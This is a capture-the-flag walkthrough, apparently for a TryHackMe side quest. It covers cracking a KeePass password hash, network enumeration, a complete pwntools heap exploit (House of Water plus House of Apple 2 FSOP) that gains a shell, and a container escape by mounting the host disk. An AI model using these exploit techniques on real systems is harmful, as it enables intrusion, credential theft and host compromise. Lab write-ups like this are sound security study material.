# Scheme Catcher - SQ2

## Unlocking the Access Key

This challenge is unlocked by finding the Side Quest key in Advent of Cyber Day 9.

<aside>

*“For those who want another challenge, have a look around the VM to get access to the key for **Side Quest 2**!”*

</aside>

### Extracting the KeePass Hash

A KeePass database (`Passwords.kdbx`) was discovered on the VM. 

![image.png](images/image.png)

To begin the attack, the database hash was extracted using `keepass2john`:

```json
./keepass2john ~/Desktop/Passwords.kdbx > keepass.hash
```

This produces a John the Ripper–compatible hash:

```json
Passwords:$keepass$*4*20*ef636ddf*67108864*19*2*695a889e93e7279803646b988243060740965d661f0627256bc4da2bdd88da43*06c64226005acd9a116702b3248ae4191572df0293ee31ab4f2f7ccffebc2c68*03d9a29a67fb4bb500000400021000000031c1f2e6bf714350be5805216afc5aff0304000000010000000420000000695a889e93e7279803646b988243060740965d661f0627256bc4da2bdd88da430710000000958513b5c2c36a02c5e822d6b74ccb420b8b00000000014205000000245555494410000000ef636ddf8c29444b91f7a9a403e30a0c05010000004908000000140000000000000005010000004d08000000000000040000000004010000005004000000020000004201000000532000000006c64226005acd9a116702b3248ae4191572df0293ee31ab4f2f7ccffebc2c6804010000005604000000130000000000040000000d0a0d0a*41b1d7deecfba1baa64171a51f88ecc66e97e20056c6fb245ad13e7ff9b37ff1
```

### Cracking the KeePass Password

The extracted hash was cracked using John the Ripper with the `rockyou.txt` wordlist:

```json
./john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash
```

The password was successfully recovered:

![image.png](images/image%201.png)

### Accessing the KeePass Database

With the password obtained, the database was opened using `keepassxc-cli`:

```json
keepassxc-cli open .Passwords.kdbx
```

After entering the password, an interactive KeePass shell was provided:

```json
Enter password to unlock .Passwords.kdbx: 
Scheme Catcher> 
```

### Enumerating Database Entries

To identify relevant entries, the database contents were listed:

```json
Scheme Catcher> ls
Key
```

Inspecting the entry revealed an attached image file:

```json
Scheme Catcher> show --show-attachments Key
```

Output:

```json
Title: Key
UserName:
Password: PROTECTED
Attachments:
  sq2.png (408.9 KiB)
```

### Extracting the Side Quest Key

The attachment was exported from the database:

```json
attachment-export Key sq2.png sq2.png
```

Opening the extracted image revealed the **Side Quest 2 access key.**

# Phase 1 — Network Enumeration

## Port Enumeration

To identify all open TCP ports, I performed a full port scan:

```python
nmap -sT -p- -vvv -T5 10.64.176.91
```

**Results:**

```python
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack
80/tcp    open  http    syn-ack
9004/tcp  open  unknown syn-ack
21337/tcp open  unknown syn-ack
```

## Service Enumeration

Next, service and version detection was performed on the identified ports:

```python
nmap -sV -p 22,80,9004,21337 -vvv -T5 10.64.176.91
```

**Results**:

```python
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 62 OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    syn-ack ttl 62 Apache httpd 2.4.58 ((Ubuntu))
9004/tcp  open  unknown syn-ack ttl 61
21337/tcp open  http    syn-ack ttl 62 Werkzeug httpd 3.0.1 (Python 3.12.3)
```

# **Phase 2 — Web & Binary Analysis**

## Port 80 Enumeration

Port 80 hosted a static web page with no interactive functionality.

Directory brute-forcing revealed a `/dev` directory:

```python
gobuster dir -u http://10.64.176.91 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Results:**

```python
/index.html           (Status: 200) [Size: 3455]
/dev                  (Status: 301) [Size: 310] [--> http://10.64.176.91/dev/]
```

Inside `/dev`, a ZIP archive was discovered.

![image.png](images/image%202.png)

## Beacon Binary Analysis

Extracting the archive produced `beacon.bin`.

Basic static analysis revealed the first flag:

```python
strings beacon.bin
```

**Flag #1**

```python
THM{REDACTED}
```

Further testing revealed the binary required a key:

```python
[REDACTED]
```

Running the binary showed it attempted to connect to a local service on port **4444**.

![image.png](images/images/image%203.png)

Connecting manually:

```
ncat localhost 4444
```

Upon execution, the beacon initiated an **HTTP request** to the following endpoint:

```python
/7ln6Z1X9EF
```

![image.png](images/image%204.png)

This confirmed that the binary was acting as a simple HTTP client, requesting a specific resource.

### **Endpoint Enumeration**

Manually navigating to the requested endpoint revealed additional content:

- A new ZIP archive
- The second challenge flag

![image.png](images/image%205.png)

**Flag #2**

```python
THM{REDACTED}
```

# Phase 3 — Heap Exploitation (House of Water)

## Vulnerability Overview

The service on port **9004** was vulnerable to a **House of Water** heap exploitation technique.

Due to the lack of direct leaks, the exploit required **partial pointer brute-forcing**.

**Reference used:**

```
[https://corgi.rip/posts/leakless_heap_1/](https://corgi.rip/posts/leakless_heap_1/)
```

## Exploit Strategy

- Abuse heap layout manipulation
- Brute-force heap and libc LSBs (4-bit entropy)
- Gain control over `stdout`
- Leak libc base
- Achieve RCE via **House of Apple 2 (FSOP)**

**Exploit Script**
A Python exploit was developed using **pwntools** to automate the brute-force and exploitation process.

```python
#!/usr/bin/env python3

from pwn import *
import io_file

context.update(arch="amd64", os="linux", log_level="debug")
context.binary = elf = ELF("./server", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
exit_off = libc.sym['exit']
stdout_off = libc.sym['_IO_2_1_stdout_']
# Try all possible 4-bit combinations (0-15)
for heap_brute in range(16):
	for libc_brute in range(16):
		try:
			print(f"Trying heap_brute={heap_brute:#x}, libc_brute={libc_brute:#x}")
			
			#r = process()
			#gdb.attach(r)
			r = remote("<IP>", 9004)
			r.timeout = 3
			
			idx = -1

			def create(size):
				global idx
				idx = idx+1
				r.sendlineafter(b'\n>>', b'1')
				r.sendlineafter(b'size: \n', str(size).encode())
				return idx

			def update(index, data, offset=0):
				r.sendlineafter(b'\n>>', b'2')
				r.sendlineafter(b'idx:\n', str(index).encode())
				r.sendlineafter(b'offset:\n', str(offset).encode())
				r.sendafter(b'data:\n', data)

			def delete(index):
				r.sendlineafter(b'\n>>', b'3')
				r.sendlineafter(b'idx:\n', str(index).encode())

			for _ in range(7): # we will fill up the tcache with this later
				create(0x90-8) 

			middle = create(0x90-8) # 'middle' unsortedbin chunk

			playground = create(0x20 + 0x30 + 0x500 + (0x90-8)*2)
			guard = create(0x18) # guard 1 (at bottom of heap)
			delete(playground) # cause UAF
			guard = create(0x18) # guard 2 (remaindered, right below the 8 0x90 chunks)

			# begin to remainder 'playground'
			corruptme = create(0x4c8)
			start_M = create(0x90-8) # start-0x10
			midguard = create(0x28) # prevent consolidation of start_M / end_M
			end_M = create(0x90-8) # end-0x10
			leftovers = create(0x28) # rest of unsortedbin chunk
				
			update(playground,p64(0x651),0x18) # change size to what it was pre-consolidation
			delete(corruptme)

			offset = create(0x4c8+0x10) # we offset by 0x10
			start = create(0x90-8) # start
			midguard = create(0x28)
			end = create(0x90-8) # end
			leftovers = create(0x18) # rest of unsortedbin chunk

			# move forward a bunch
			# we've taken 0xda0 bytes from the top chunk so far, and we want to control the data at
			# heap_base+0x10080 to provide our fake 0x10000 chunk a valid prev_size
			create((0x10000+0x80)-0xda0-0x18)
			fake_data = create(0x18)
			update(fake_data,p64(0x10000)+p64(0x20)) # fake prev_size and size

			# now we create the fake size on the tcache_perthread_struct
			fake_size_lsb = create(0x3d8);
			fake_size_msb = create(0x3e8);
			delete(fake_size_lsb)
			delete(fake_size_msb)
			# now our fake chunk has a size of '0x10001'

			update(playground,p64(0x31),0x4e8) # update size of start_M from 0x91 to 0x31
			delete(start_M) # now &start is in the 0x31 tcache bin
			update(start_M,p64(0x91),8) # this corrupts start's metadata (because it's 0x10 bytes behind) so we repair its size

			# now we do the same to end_M, but we delete it into the 0x21 bin instead
			update(playground,p64(0x21),0x5a8)
			delete(end_M)
			update(end_M,p64(0x91),8)

			# now we fill up the 0x90 tcache
			for i in range(7):
				delete(i)

			# create unsortedbin list
			delete(end)
			delete(middle)
			delete(start)

			libc_leak = libc_brute
			heap_leak = heap_brute
			heap_target = (heap_leak << 12) + 0x80
			update(start,p16(heap_target))
			update(end,p16(heap_target),8)
			print(f"{heap_target=:#x}")
			exit_lsb = (libc_leak << 12) + (exit_off & 0xffff) # last 2 bytes of exit()
			stdout_offset = stdout_off - exit_off # just relative offset, no libc leak yet
			stdout_lsb = (exit_lsb + stdout_offset) & 0xffff # last 2 bytes of stdout
			print(f"{stdout_lsb=:#x}")
			
			win = create(0x888) # tcache_perthread_struct control
			
			
			"""
			Step 2: RCE
			We will first perform a partial overwrite of the stdout file stream
			to force it to leak out a libc pointer to us, then use the House of Apple 2
			to get RCE using FSOP.
			"""
			update(win,p16(stdout_lsb),8) # change 0x31 bin to point to stdout
			stdout = create(0x28)
			# force leak w/ _IO_write_base partial overwrite
			context.log_level = "debug"
			update(stdout,p64(0xfbad3887)+p64(0)*3+p8(0))
			
			libc_leak = u64(r.recv(8))
			libc.address = libc_leak - (stdout_off+132)
			print(f"{libc.address=:#x}")
			
			

			# prepare house of apple2 payload
			file = io_file.IO_FILE_plus_struct() 
			payload = file.house_of_apple2_execmd_when_do_IO_operation(
				libc.sym['_IO_2_1_stdout_'],
				libc.sym['_IO_wfile_jumps'],
				libc.sym['system'])
			# updateing 60th bin (0x3e0) of tcache for full stdout control
			update(win,p64(libc.sym['_IO_2_1_stdout_']),8*60)
			full_stdout = create(0x3e0-8)
			update(full_stdout,payload)

			r.interactive()

		except Exception as e:
			context.log_level = "error"
			print(e)
			continue
```

The exploit successfully yielded a shell, though it was initially unstable.

## **Stabilizing the Shell**

To stabilize the shell:

```bash
script -qc /bin/bash /dev/null
```

Then:

```bash
python3 -c'import pty; pty.spawn("/bin/bash")'
```

With a stable shell, the user flag was retrieved.

**Flag #4**

```
THM{REDACTED}
```

# Phase 5 — Container Escape

## Identifying the Host Filesystem

Running `lsblk` revealed that the host’s disk was partially mounted inside the container:

```
NAME          MAJ:MIN RM   SIZE RO TYPE MOUNTPOINTS
nvme0n1       259:0    0    60G  0 disk 
`-nvme0n1p1   259:2    0    60G  0 part /etc/hosts
                                      /etc/hostname
                                      /etc/resolv.conf
```

The partition `nvme0n1p1` was mapped to container paths like `/etc/hosts`, confirming host exposure.

## **Mounting the Host Root Filesystem**

Since the container was running as root, the host filesystem was mounted directly:

```bash
mkdir /mnt/host_root
mount /dev/nvme0n1p1 /mnt/host_root
ls /mnt/host_root
```

This revealed the full host filesystem.

```python
bin   etc   home   lib64   root   usr   var ...
```

### **Retrieving the Kernel Key**

The kernel module key was retrieved directly from the host:

```bash
cat /mnt/host_root/root/kkey
```

**Key:**

```
[REDACTED]
```

### Final Flag Acquisition

With full access to the host's filesystem, the final flag was retrieved.

```python
cat /mnt/host_root/root/root.txt
```

**Flag #5**

```
THM{REDACTED}
```
